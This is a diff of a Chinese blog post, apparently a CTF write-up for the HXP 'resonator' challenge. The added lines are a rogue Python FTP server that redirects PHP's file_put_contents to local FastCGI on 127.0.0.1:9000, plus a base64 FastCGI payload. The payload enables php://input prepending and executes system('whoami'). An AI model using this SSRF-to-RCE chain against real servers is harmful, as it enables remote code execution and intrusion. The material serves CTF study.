@@ -86,7 +86,7 @@
             <h1>HXP resonator(利用file_put_contents打SSRF)</h1>
             <span class="meta">
             	Posted on
-              2021-01-13，3 min read
+              2021-01-13，5 min read
             </span>
           </div>
         </div>
@@ -151,6 +151,71 @@ file_put_contents($file, $data);
 </code></pre>
 <p>这里我想通过vsftpd来配置的。。。然而发现pasv_address配置了半年。不生效。ipv6也关了。又搜到文章。说pasv_address只能填域名。我又把域名绑到了127.0.0.1。发现还是不行。<br>
 有大佬知道忘告知😅</p>
+<p>通过python自己编写FTP Server<br>
+server.py</p>
+<pre><code>import socket
+def get(conn):
+    conn.send(&quot;220 (vsFTPd 3.0.3)\n&quot;)
+    print conn.recv(200)
+    conn.send(&quot;331 Please specify the password.\n&quot;)
+    print conn.recv(200)
+    conn.send(&quot;230 Login successful.\n&quot;)
+    print conn.recv(200)
+    conn.send(&quot;200 Switching to Binary mode.\n&quot;)
+    print conn.recv(200)
+    conn.send(&quot;213 3\n&quot;)
+    print conn.recv(200)
+    conn.send(&quot;229 Entering Extended Passive Mode (|||1337|)\n&quot;)
+    print conn.recv(200)
+    conn.send(&quot;150 Opening BINARY mode data connection for /test/test.php (3 bytes).\n&quot;)
+    conn.send(&quot;226 Transfer complete.\n&quot;)
+    print conn.recv(200)
+    conn.send(&quot;221 Goodbye.\n&quot;)
+    conn.close()
+def put(conn):
+    conn.send(&quot;220 (vsFTPd 3.0.3)\n&quot;);
+    print conn.recv(20)
+    conn.send(&quot;331 Please specify the password.\n&quot;);
+    print conn.recv(20)
+    conn.send(&quot;230 Login successful.\n&quot;)
+    print conn.recv(20)
+    conn.send(&quot;200 Switching to Binary mode.\n&quot;);
+    print conn.recv(20)
+    conn.send(&quot;550 Could not get file size.\n&quot;);
+    print conn.recv(20)
+    conn.send(&quot;227 127,0,0,1,8,6952\n&quot;)
+    print conn.recv(20)
+    conn.send(&quot;227 127,0,0,1,8,6952\n&quot;)
+    print conn.recv(20)
+    conn.send(&quot;150 Ok to send data.\n&quot;)
+    conn.send(&quot;226 Transfer complete.\n&quot;)
+    print conn.recv(20)
+    conn.send(&quot;221 Goodbye.\n&quot;);
+    conn.close()
+host = '0.0.0.0'
+port = 22
+sk = socket.socket()
+sk.bind((host, port))
+sk.listen(5)
+conn,address = sk.accept()
+get(conn)
+conn,address=sk.accept()
+put(conn)
+</code></pre>
+<p>2.py</p>
+<pre><code>import socket
+import base64
+host = '0.0.0.0'
+port = 1337
+sk = socket.socket()
+sk.bind((host, port))
+sk.listen(5)
+
+conn,address = sk.accept()
+conn.send(base64.b64decode(&quot;AQEAAQAIAAAAAQAAAAAAAAEEAAEBBAQADxBTRVJWRVJfU09GVFdBUkVnbyAvIGZjZ2ljbGllbnQgCwlSRU1PVEVfQUREUjEyNy4wLjAuMQ8IU0VSVkVSX1BST1RPQ09MSFRUUC8xLjEOAkNPTlRFTlRfTEVOR1RINTgOBFJFUVVFU1RfTUVUSE9EUE9TVAlLUEhQX1ZBTFVFYWxsb3dfdXJsX2luY2x1ZGUgPSBPbgpkaXNhYmxlX2Z1bmN0aW9ucyA9IAphdXRvX3ByZXBlbmRfZmlsZSA9IHBocDovL2lucHV0DxdTQ1JJUFRfRklMRU5BTUUvdmFyL3d3dy9odG1sL2luZGV4LnBocA0BRE9DVU1FTlRfUk9PVC8AAAAAAQQAAQAAAAABBQABADoEADw/cGhwIHN5c3RlbSgnd2hvYW1pJyk7ZGllKCctLS0tLU1hZGUtYnktU3B5RDNyLS0tLS0KJyk7Pz4AAAAA&quot;))
+conn.close()
+</code></pre>
+<p>base64编码的为EXP</p>
 
           
           <p class="next-post">下一篇：
